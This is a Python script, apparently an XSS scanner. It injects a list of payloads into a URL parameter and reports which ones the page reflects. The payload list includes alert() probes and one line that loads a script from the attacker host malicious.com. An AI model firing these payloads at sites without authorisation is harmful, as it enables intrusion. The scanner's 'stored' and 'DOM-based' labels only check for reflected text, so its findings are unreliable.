import requests
import time
import csv
from prettytable import PrettyTable
from bs4 import BeautifulSoup, Comment
from threading import Lock

# Initialize a lock for thread safety
lock = Lock()

def send_request(url, data=None, allow_redirects=True):
    """Send an HTTP request to the specified URL."""
    try:
        if data:
            response = requests.post(url, data=data, allow_redirects=allow_redirects)
        else:
            response = requests.get(url, allow_redirects=allow_redirects)
        return response
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def test_xss(url, payloads):
    """Test for XSS vulnerabilities using the provided payloads."""
    table = PrettyTable(["URL", "Payload", "Vulnerability"])
    table.align["Vulnerability"] = "l"

    for payload in payloads:
        test_url = f"{url}?param={payload}"
        response = send_request(test_url)
        if response:
            try:
                soup = BeautifulSoup(response.text, "html.parser")

                # Check for reflected XSS
                if payload in str(soup):
                    table.add_row([test_url, payload, "Reflected XSS detected"])

                # Check for stored XSS
                if payload in str(soup.find_all(["script", "iframe", "object"])):
                    table.add_row([test_url, payload, "Stored XSS detected"])

                # Check for DOM-based XSS
                if payload in str(soup.find_all(["script"])):
                    table.add_row([test_url, payload, "DOM-based XSS detected"])

                # Check for XSS in meta tags
                if payload in str(soup.find_all(["meta"])):
                    table.add_row([test_url, payload, "XSS in meta tags detected"])

                # Check for XSS in comments
                for element in soup(text=lambda text: isinstance(text, Comment)):
                    if payload in str(element):
                        table.add_row([test_url, payload, "XSS in comments detected"])
            except Exception as e:
                print(f"Error processing {test_url}: {e}")
        time.sleep(0.1)

    with lock:
        # Write the results to a CSV file
        with open('xss_results.csv', mode='w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(table.field_names)  # Write the header
            writer.writerows(table.rows)         # Write the data rows

        # Print the table to console
        print(table)

xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<script src='http://malicious.com/xss.js'></script>"
    ]
